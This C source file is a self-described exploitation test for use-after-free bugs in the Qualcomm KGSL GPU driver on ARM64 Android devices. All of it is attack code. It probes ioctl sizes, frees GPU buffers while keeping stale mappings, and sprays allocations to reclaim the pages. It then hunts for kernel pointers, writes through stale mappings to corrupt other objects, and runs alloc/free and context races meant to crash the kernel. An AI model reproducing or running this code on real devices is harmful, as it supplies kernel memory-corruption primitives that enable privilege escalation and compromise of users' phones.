/*
 * kgsl_mmap_uaf.c — KGSL mmap-after-free exploitation test
 *
 * Tests for use-after-free via KGSL GPU memory:
 * 1. Allocate GPU memory via GPUMEM_ALLOC_ID
 * 2. mmap it into userspace
 * 3. Free via GPUMEM_FREE_ID
 * 4. Check if the mapping is still valid (stale mmap)
 * 5. Reallocate new GPU memory → might reuse backing pages
 * 6. Write via stale mapping → cross-object data corruption
 *
 * Compile: aarch64-linux-musl-gcc -static -O2 -o kgsl_mmap_uaf kgsl_mmap_uaf.c -lpthread
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <pthread.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <stdint.h>

#define KGSL_IOC_TYPE 0x09

/*
 * KGSL structs — correct ARM64 sizes.
 * size_t = 8 bytes on arm64.
 * Session 8 confirmed GPUMEM_ALLOC_ID works at 48 bytes.
 */

/* 48 bytes on ARM64 */
struct kgsl_gpumem_alloc_id {
    unsigned int id;          /* 0: out */
    unsigned int flags;       /* 4: in */
    size_t size;              /* 8: in (8 bytes on arm64) */
    size_t mmapsize;          /* 16: out */
    unsigned long gpuaddr;    /* 24: out */
    unsigned long __pad;      /* 32: reserved */
    unsigned long __pad2;     /* 40: reserved */
};

/* 8 bytes */
struct kgsl_gpumem_free_id {
    unsigned int id;
    unsigned int __pad;
};

/* 48 bytes on ARM64 — using size_t for size fields */
struct kgsl_gpumem_get_info {
    unsigned long gpuaddr;    /* 0: in/out */
    unsigned int id;          /* 8: in */
    unsigned int flags;       /* 12: out */
    size_t size;              /* 16: out (8 bytes on arm64) */
    size_t mmapsize;          /* 24: out */
    unsigned long useraddr;   /* 32: out */
};

struct kgsl_drawctxt_create {
    unsigned int flags;
    unsigned int drawctxt_id;
};

struct kgsl_drawctxt_destroy {
    unsigned int drawctxt_id;
};

/* Use sizeof to encode correct ioctl numbers */
#define IOCTL_KGSL_GPUMEM_ALLOC_ID  _IOWR(KGSL_IOC_TYPE, 0x34, struct kgsl_gpumem_alloc_id)
#define IOCTL_KGSL_GPUMEM_FREE_ID   _IOWR(KGSL_IOC_TYPE, 0x35, struct kgsl_gpumem_free_id)
#define IOCTL_KGSL_GPUMEM_GET_INFO  _IOWR(KGSL_IOC_TYPE, 0x36, struct kgsl_gpumem_get_info)
#define IOCTL_KGSL_DRAWCTXT_CREATE  _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)
#define IOCTL_KGSL_DRAWCTXT_DESTROY _IOWR(KGSL_IOC_TYPE, 0x14, struct kgsl_drawctxt_destroy)

/* Also define raw ioctl for size probing */
#define MAKE_IOCTL_RW(nr, sz) (0xC0000000 | ((sz) << 16) | (KGSL_IOC_TYPE << 8) | (nr))
#define MAKE_IOCTL_W(nr, sz)  (0x40000000 | ((sz) << 16) | (KGSL_IOC_TYPE << 8) | (nr))

/* Context flags */
#define KGSL_CONTEXT_SUBMIT_IB_LIST    0x00000010
#define KGSL_CONTEXT_CTX_SWITCH        0x00000020
#define KGSL_CONTEXT_PREAMBLE          0x00000040
#define KGSL_CONTEXT_PER_CONTEXT_TS    0x00000100
#define KGSL_CONTEXT_TYPE_GL           0x00010000

static int kgsl_fd = -1;
static unsigned long actual_alloc_cmd = 0;
static unsigned long actual_free_cmd = 0;
static unsigned long actual_info_cmd = 0;

/* Probe to find correct ioctl size */
static void probe_ioctl_sizes(void) {
    printf("\n=== Probing GPUMEM_ALLOC_ID sizes ===\n");
    printf("  Compiled: ALLOC=0x%lx (size=%zu) FREE=0x%lx GET_INFO=0x%lx\n",
           (unsigned long)IOCTL_KGSL_GPUMEM_ALLOC_ID,
           sizeof(struct kgsl_gpumem_alloc_id),
           (unsigned long)IOCTL_KGSL_GPUMEM_FREE_ID,
           (unsigned long)IOCTL_KGSL_GPUMEM_GET_INFO);

    unsigned char buf[128];
    for (int size = 24; size <= 64; size += 4) {
        memset(buf, 0, sizeof(buf));
        /* Set size field at offset 8 (size_t = 8 bytes) to 4096 */
        *(size_t *)(buf + 8) = 4096;

        unsigned long cmd = MAKE_IOCTL_RW(0x34, size);
        errno = 0;
        int ret = ioctl(kgsl_fd, cmd, buf);
        if (ret == 0) {
            unsigned int id = *(unsigned int *)(buf + 0);
            unsigned long gpuaddr = *(unsigned long *)(buf + 24);
            printf("  >>> SIZE %d WORKS! cmd=0x%08lx id=%u gpuaddr=0x%lx\n",
                   size, cmd, id, gpuaddr);
            actual_alloc_cmd = cmd;

            /* Free it */
            unsigned char fbuf[16] = {0};
            *(unsigned int *)fbuf = id;
            /* Try matching free sizes — BB Priv uses _IOWR for ALL ioctls */
            for (int fs = 4; fs <= 16; fs += 4) {
                errno = 0;
                /* Try _IOWR (read-write) first — BB Priv KGSL uses this */
                int fr = ioctl(kgsl_fd, MAKE_IOCTL_RW(0x35, fs), fbuf);
                if (fr == 0) {
                    printf("  >>> FREE SIZE %d WORKS (RW)! cmd=0x%08lx\n", fs, MAKE_IOCTL_RW(0x35, fs));
                    actual_free_cmd = MAKE_IOCTL_RW(0x35, fs);
                    break;
                }
                /* Fallback: try _IOW (write-only) */
                fr = ioctl(kgsl_fd, MAKE_IOCTL_W(0x35, fs), fbuf);
                if (fr == 0) {
                    printf("  >>> FREE SIZE %d WORKS (W)! cmd=0x%08lx\n", fs, MAKE_IOCTL_W(0x35, fs));
                    actual_free_cmd = MAKE_IOCTL_W(0x35, fs);
                    break;
                }
            }
        } else if (errno != ENOTTY) {
            printf("  size %d: ret=%d errno=%d (%s) cmd=0x%08lx\n",
                   size, ret, errno, strerror(errno), cmd);
        }
    }

    /* Probe GET_INFO sizes */
    if (actual_alloc_cmd) {
        /* Alloc a buffer to test GET_INFO on */
        unsigned char abuf[64] = {0};
        *(size_t *)(abuf + 8) = 4096;
        if (ioctl(kgsl_fd, actual_alloc_cmd, abuf) == 0) {
            unsigned int test_id = *(unsigned int *)(abuf);

            for (int size = 24; size <= 64; size += 4) {
                unsigned char ibuf[128] = {0};
                *(unsigned int *)(ibuf + 8) = test_id;  /* id at offset 8 */
                unsigned long cmd = MAKE_IOCTL_RW(0x36, size);
                errno = 0;
                int ret = ioctl(kgsl_fd, cmd, ibuf);
                if (ret == 0) {
                    printf("  >>> GET_INFO SIZE %d WORKS! cmd=0x%08lx\n", size, cmd);
                    actual_info_cmd = cmd;
                    break;
                }
            }

            /* Free test buffer */
            if (actual_free_cmd) {
                unsigned char fbuf[16] = {0};
                *(unsigned int *)fbuf = test_id;
                ioctl(kgsl_fd, actual_free_cmd, fbuf);
            }
        }
    }

    if (!actual_alloc_cmd) {
        printf("  GPUMEM_ALLOC_ID: no working size found!\n");
    }
}

static int gpu_alloc(unsigned int size_bytes, unsigned int flags,
                     unsigned int *out_id, unsigned long *out_gpuaddr,
                     size_t *out_mmapsize) {
    unsigned char buf[64] = {0};
    *(unsigned int *)(buf + 4) = flags;    /* flags at offset 4 */
    *(size_t *)(buf + 8) = size_bytes;     /* size at offset 8 */

    int ret = ioctl(kgsl_fd, actual_alloc_cmd, buf);
    if (ret < 0) return -1;

    if (out_id) *out_id = *(unsigned int *)(buf + 0);
    if (out_gpuaddr) *out_gpuaddr = *(unsigned long *)(buf + 24);
    if (out_mmapsize) *out_mmapsize = *(size_t *)(buf + 16);
    return 0;
}

static int gpu_free(unsigned int id) {
    unsigned char buf[16] = {0};
    *(unsigned int *)buf = id;
    return ioctl(kgsl_fd, actual_free_cmd, buf);
}

/*========== TEST 1: Basic GPU memory alloc/mmap/free ==========*/
static void test_basic_gpumem(void) {
    printf("\n=== TEST 1: Basic GPU memory operations ===\n");

    unsigned int id = 0;
    unsigned long gpuaddr = 0;
    size_t mmapsize = 0;

    if (gpu_alloc(4096, 0, &id, &gpuaddr, &mmapsize) < 0) {
        printf("  alloc failed: %s\n", strerror(errno));
        return;
    }
    printf("  allocated: id=%u gpuaddr=0x%lx mmapsize=%zu\n", id, gpuaddr, mmapsize);

    /* Try various mmap strategies */
    unsigned int mmap_sz = mmapsize ? mmapsize : 4096;
    void *map = MAP_FAILED;

    off_t offsets[] = {
        (off_t)id * getpagesize(),
        (off_t)gpuaddr,
        0,
        (off_t)id * 4096,
        (off_t)(id << 12),
    };
    const char *names[] = { "id*page", "gpuaddr", "0", "id*4096", "id<<12" };

    for (int i = 0; i < 5; i++) {
        map = mmap(NULL, mmap_sz, PROT_READ | PROT_WRITE, MAP_SHARED,
                   kgsl_fd, offsets[i]);
        if (map != MAP_FAILED) {
            printf("  mmap OK at %p (offset=%s=0x%lx)\n",
                   map, names[i], (unsigned long)offsets[i]);
            break;
        }
    }

    if (map == MAP_FAILED) {
        printf("  all mmap attempts failed: %s\n", strerror(errno));
        printf("  trying PROT_READ only...\n");
        for (int i = 0; i < 5; i++) {
            map = mmap(NULL, mmap_sz, PROT_READ, MAP_SHARED, kgsl_fd, offsets[i]);
            if (map != MAP_FAILED) {
                printf("  mmap READ-ONLY at %p (offset=%s)\n", map, names[i]);
                break;
            }
        }
    }

    if (map == MAP_FAILED) {
        printf("  mmap completely failed\n");
        gpu_free(id);
        return;
    }

    /* Write test */
    memset(map, 0x41, mmap_sz);
    int ok = 1;
    for (unsigned int i = 0; i < mmap_sz; i++) {
        if (((unsigned char *)map)[i] != 0x41) { ok = 0; break; }
    }
    printf("  write+readback: %s\n", ok ? "OK" : "MISMATCH");

    munmap(map, mmap_sz);
    gpu_free(id);
    printf("  freed OK\n");
}

/*========== TEST 2: mmap-after-free ==========*/
static void test_mmap_after_free(void) {
    printf("\n=== TEST 2: mmap-after-free test ===\n");

    unsigned int id1 = 0;
    unsigned long gpuaddr1 = 0;
    size_t mmapsize1 = 0;

    if (gpu_alloc(4096, 0, &id1, &gpuaddr1, &mmapsize1) < 0) {
        printf("  alloc failed: %s\n", strerror(errno));
        return;
    }
    printf("  buf1: id=%u gpuaddr=0x%lx mmapsize=%zu\n", id1, gpuaddr1, mmapsize1);

    unsigned int mmap_sz = mmapsize1 ? mmapsize1 : 4096;

    /* mmap it */
    void *map1 = MAP_FAILED;
    off_t offsets[] = { (off_t)id1 * getpagesize(), (off_t)gpuaddr1, 0 };
    for (int i = 0; i < 3; i++) {
        map1 = mmap(NULL, mmap_sz, PROT_READ | PROT_WRITE, MAP_SHARED,
                    kgsl_fd, offsets[i]);
        if (map1 != MAP_FAILED) break;
    }

    if (map1 == MAP_FAILED) {
        printf("  mmap failed: %s\n", strerror(errno));
        gpu_free(id1);
        return;
    }

    /* Write marker */
    memset(map1, 0xAA, mmap_sz);
    printf("  wrote 0xAA to buf1 at %p\n", map1);

    /* Free but DON'T munmap */
    int ret = gpu_free(id1);
    printf("  freed buf1: %s\n", ret == 0 ? "OK" : strerror(errno));

    /* Fork to safely probe the stale mapping */
    pid_t pid = fork();
    if (pid == 0) {
        volatile unsigned char *p = (volatile unsigned char *)map1;

        /* Try to read */
        unsigned char val = p[0];
        printf("  post-free read[0]: 0x%02x (expected 0xAA)\n", val);

        /* Check if data intact */
        int changed = 0;
        for (unsigned int i = 0; i < mmap_sz; i++) {
            if (p[i] != 0xAA) { changed = i + 1; break; }
        }
        if (changed) {
            printf("  >>> DATA CHANGED at byte %d after free! <<<\n", changed - 1);
            printf("  first 32 bytes: ");
            for (int i = 0; i < 32; i++) printf("%02x ", p[i]);
            printf("\n");
        } else {
            printf("  data still 0xAA after free (mapping not invalidated)\n");
        }

        /* Spray new allocations to reclaim pages */
        unsigned int new_ids[256];
        int alloc_count = 0;
        for (int i = 0; i < 256; i++) {
            unsigned long ga;
            size_t ms;
            if (gpu_alloc(4096, 0, &new_ids[i], &ga, &ms) == 0) {
                alloc_count++;
            } else break;
        }
        printf("  sprayed %d new GPU buffers\n", alloc_count);

        /* Check stale mapping again */
        changed = 0;
        for (unsigned int i = 0; i < mmap_sz; i++) {
            if (p[i] != 0xAA) { changed = i + 1; break; }
        }
        if (changed) {
            printf("  >>> STALE MAPPING SHOWS NEW DATA! UAF CONFIRMED! <<<\n");
            printf("  first 64 bytes:\n  ");
            for (int i = 0; i < 64; i++) {
                printf("%02x ", p[i]);
                if ((i + 1) % 16 == 0) printf("\n  ");
            }

            /* Check for kernel pointers */
            for (unsigned int i = 0; i < mmap_sz - 7; i += 8) {
                uint64_t v;
                memcpy(&v, (void *)(p + i), 8);
                if ((v & 0xFFFFFF0000000000ULL) == 0xffffffc000000000ULL) {
                    printf("  KERNEL PTR at +%u: 0x%016llx\n", i, (unsigned long long)v);
                }
            }
        } else {
            printf("  stale mapping unchanged after spray\n");
        }

        /* Try to write via stale mapping */
        p[0] = 0xBB;
        printf("  stale write: %s (readback=0x%02x)\n",
               p[0] == 0xBB ? "accepted" : "failed", p[0]);

        /* Read back the sprayed buffers to see if our write corrupted them */
        for (int i = 0; i < alloc_count; i++) {
            void *m = MAP_FAILED;
            for (int j = 0; j < 2; j++) {
                off_t o = (j == 0) ? (off_t)new_ids[i] * getpagesize() : 0;
                m = mmap(NULL, 4096, PROT_READ, MAP_SHARED, kgsl_fd, o);
                if (m != MAP_FAILED) break;
            }
            if (m != MAP_FAILED) {
                if (((unsigned char *)m)[0] == 0xBB) {
                    printf("  >>> SPRAY BUF[%d] (id=%u) HAS OUR 0xBB! WRITE-THROUGH CONFIRMED! <<<\n",
                           i, new_ids[i]);
                }
                munmap(m, 4096);
            }
            gpu_free(new_ids[i]);
        }

        _exit(changed ? 42 : 0);
    }

    int status;
    alarm(15);
    waitpid(pid, &status, 0);
    alarm(0);

    if (WIFEXITED(status)) {
        printf("  result: %s (exit=%d)\n",
               WEXITSTATUS(status) == 42 ? "UAF DETECTED!" : "no UAF",
               WEXITSTATUS(status));
    } else if (WIFSIGNALED(status)) {
        printf("  child killed signal %d (mapping invalidated)\n", WTERMSIG(status));
    }

    munmap(map1, mmap_sz);
}

/*========== TEST 3: Alloc/free race ==========*/
static volatile int race_stop = 0;

static void *race_thread(void *arg) {
    int count = 0;
    while (!race_stop) {
        unsigned int id;
        unsigned long ga;
        size_t ms;
        if (gpu_alloc(4096, 0, &id, &ga, &ms) == 0) {
            count++;
            gpu_free(id);
        }
        usleep(10);
    }
    printf("  race thread: %d alloc/free cycles\n", count);
    return NULL;
}

static void test_race(void) {
    printf("\n=== TEST 3: Alloc/free race (3 seconds) ===\n");

    pid_t pid = fork();
    if (pid == 0) {
        race_stop = 0;
        pthread_t t[4];
        for (int i = 0; i < 4; i++)
            pthread_create(&t[i], NULL, race_thread, NULL);
        sleep(3);
        race_stop = 1;
        for (int i = 0; i < 4; i++)
            pthread_join(t[i], NULL);
        printf("  no crash\n");
        _exit(0);
    }

    alarm(10);
    int status;
    waitpid(pid, &status, 0);
    alarm(0);

    if (WIFEXITED(status))
        printf("  result: clean\n");
    else if (WIFSIGNALED(status))
        printf("  >>> CRASH signal %d — race vulnerability! <<<\n", WTERMSIG(status));
}

/*========== TEST 4: Context create/destroy race ==========*/
static volatile int ctx_stop = 0;

static void *ctx_thread(void *arg) {
    int count = 0;
    while (!ctx_stop) {
        struct kgsl_drawctxt_create req = {0};
        req.flags = KGSL_CONTEXT_SUBMIT_IB_LIST | KGSL_CONTEXT_CTX_SWITCH |
                   KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_PER_CONTEXT_TS |
                   KGSL_CONTEXT_TYPE_GL;
        if (ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_CREATE, &req) == 0) {
            count++;
            struct kgsl_drawctxt_destroy dreq = { .drawctxt_id = req.drawctxt_id };
            ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_DESTROY, &dreq);
        }
    }
    printf("  ctx thread: %d cycles\n", count);
    return NULL;
}

static void test_ctx_race(void) {
    printf("\n=== TEST 4: Context create/destroy race ===\n");

    pid_t pid = fork();
    if (pid == 0) {
        ctx_stop = 0;
        pthread_t t[4];
        for (int i = 0; i < 4; i++)
            pthread_create(&t[i], NULL, ctx_thread, NULL);
        sleep(3);
        ctx_stop = 1;
        for (int i = 0; i < 4; i++)
            pthread_join(t[i], NULL);
        printf("  no crash\n");
        _exit(0);
    }

    alarm(10);
    int status;
    waitpid(pid, &status, 0);
    alarm(0);

    if (WIFEXITED(status))
        printf("  result: clean\n");
    else if (WIFSIGNALED(status))
        printf("  >>> CRASH signal %d — context race vulnerability! <<<\n", WTERMSIG(status));
}

/*========== TEST 5: Info leak after free ==========*/
static void test_info_after_free(void) {
    printf("\n=== TEST 5: GPU memory info after free ===\n");

    if (!actual_info_cmd) {
        printf("  GET_INFO ioctl not found, skipping\n");
        return;
    }

    unsigned int ids[4];
    for (int i = 0; i < 4; i++) {
        unsigned long ga;
        size_t ms;
        if (gpu_alloc(4096, 0, &ids[i], &ga, &ms) < 0) {
            printf("  alloc %d failed\n", i);
            return;
        }
        printf("  alloc[%d]: id=%u gpuaddr=0x%lx\n", i, ids[i], ga);
    }

    /* Free id[1] and id[3] */
    gpu_free(ids[1]);
    gpu_free(ids[3]);
    printf("  freed ids %u and %u\n", ids[1], ids[3]);

    /* Try to get info on all */
    for (int i = 0; i < 4; i++) {
        unsigned char ibuf[64] = {0};
        *(unsigned int *)(ibuf + 8) = ids[i];
        int ret = ioctl(kgsl_fd, actual_info_cmd, ibuf);
        if (ret == 0) {
            unsigned long ga = *(unsigned long *)(ibuf);
            unsigned int sz = *(unsigned int *)(ibuf + 16);
            printf("  id=%u: gpuaddr=0x%lx size=%u %s\n",
                   ids[i], ga, sz,
                   (i == 1 || i == 3) ? "<<< FREED! INFO LEAK!" : "");
        } else {
            printf("  id=%u: %s %s\n", ids[i], strerror(errno),
                   (i == 0 || i == 2) ? "<<< LIVE!" : "(expected)");
        }
    }

    gpu_free(ids[0]);
    gpu_free(ids[2]);
}

int main(void) {
    printf("=== KGSL MMAP-AFTER-FREE TEST ===\n");
    printf("uid=%u\n", getuid());

    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0) {
        printf("KGSL open failed: %s\n", strerror(errno));
        return 1;
    }
    printf("KGSL opened: fd=%d\n", kgsl_fd);

    /* First: probe correct ioctl sizes */
    probe_ioctl_sizes();

    if (!actual_alloc_cmd || !actual_free_cmd) {
        printf("\nFATAL: Could not find working GPUMEM_ALLOC_ID/FREE_ID ioctls\n");
        close(kgsl_fd);
        return 1;
    }

    test_basic_gpumem();
    test_mmap_after_free();
    test_info_after_free();
    test_race();
    test_ctx_race();

    close(kgsl_fd);
    printf("\n=== ALL KGSL TESTS COMPLETE ===\n");
    return 0;
}
